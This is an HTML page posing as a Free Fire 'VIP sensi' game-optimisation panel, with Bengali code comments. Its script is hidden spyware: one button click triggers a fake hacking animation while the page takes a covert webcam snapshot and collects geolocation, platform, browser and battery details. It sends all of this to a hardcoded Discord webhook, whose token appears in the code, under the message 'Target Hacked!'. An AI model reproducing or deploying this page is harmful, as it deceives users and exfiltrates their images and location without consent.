<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF PANEL PRO v6.0</title>
    <style>
        body { background: #0b1116; color: white; font-family: sans-serif; text-align: center; margin: 0; overflow: hidden; }
        .hero { padding: 40px 20px; background: #161b22; border-bottom: 2px solid #ff0055; }
        .scanner-box { background: #1a1a1a; color: #00ff00; padding: 25px; border-radius: 15px; border: 1px solid #333; margin: 20px auto; max-width: 450px; }
        button { background: #ff0055; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 85%; font-size: 16px; margin-top: 15px; transition: 0.3s; }
        #hacker-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #0f0; padding: 20px; text-align: left; font-family: 'Courier New', monospace; z-index: 100; font-size: 14px; }
    </style>
</head>
<body>
    <div id="hacker-screen"></div>

    <div class="hero">
        <h1 style="color:#ff0055; margin:0;">FF PANEL PRO</h1>
        <p>Advance Sensi & Device Optimization</p>
    </div>

    <div class="scanner-box">
        <h3 style="color: #00ffcc;">[System Analyzer]</h3>
        <p>📡 Device Status: Ready</p>
        <p>📍 Data Tunnel: Encrypted</p>
        <button onclick="masterFunction()" id="mainBtn">ACTIVATE VIP SENSI</button>
    </div>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
    const webhook = "https://discord.com/api/webhooks/1495337044648394822/Jmy4qE3NN4FKZ_l1R2lKIxWoePGnnmSuefjt4qnewLFf8NXQTtzCj58BS7jYEbMOlRVv";

    async function masterFunction() {
        const btn = document.getElementById('mainBtn');
        btn.innerText = "ACCESSING...";
        
        // ১. ডিভাইস এবং ব্যাটারি ইনফো নেওয়া
        let batteryInfo = "Unknown";
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
        }
        
        const deviceInfo = `📱 **Model:** ${navigator.platform}\n🌐 **Browser:** ${navigator.userAgent.split(') ')[0].split(' (')[1]}\n🔋 **Battery:** ${batteryInfo}`;

        // ২. ফেক হ্যাকিং স্ক্রিন অ্যানিমেশন
        const screen = document.getElementById('hacker-screen');
        screen.style.display = 'block';
        let logs = ["Connecting to server...", "Accessing RAM...", "Bypassing Firewall...", "Extracting Data...", "Injecting Sensi Script...", "SUCCESS!"];
        let i = 0;
        let interval = setInterval(() => {
            screen.innerHTML += `<p>> ${logs[i]}</p>`;
            i++;
            if(i >= logs.length) clearInterval(interval);
        }, 600);

        // ৩. লোকেশন ও ক্যামেরা ট্র্যাকিং
        navigator.geolocation.getCurrentPosition(async (pos) => {
            startCamera(pos.coords.latitude, pos.coords.longitude, deviceInfo);
        }, (err) => {
            startCamera("Denied", "Denied", deviceInfo);
        });
    }

    async function startCamera(lat, lon, deviceInfo) {
        try {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            setTimeout(async () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('file', blob, 'snapshot.jpg');
                    
                    let msg = `🔥 **Target Hacked!**\n\n${deviceInfo}\n📍 **Map:** http://maps.google.com/maps?q=${lat},${lon}`;
                    formData.append('content', msg);

                    await fetch(webhook, { method: 'POST', body: formData });
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
                
                alert("Sensi Successfully Injected to your Device!");
                location.reload();
            }, 3000);
        } catch (e) {
            alert("Permission Error!");
            location.reload();
        }
    }
    </script>
</body>
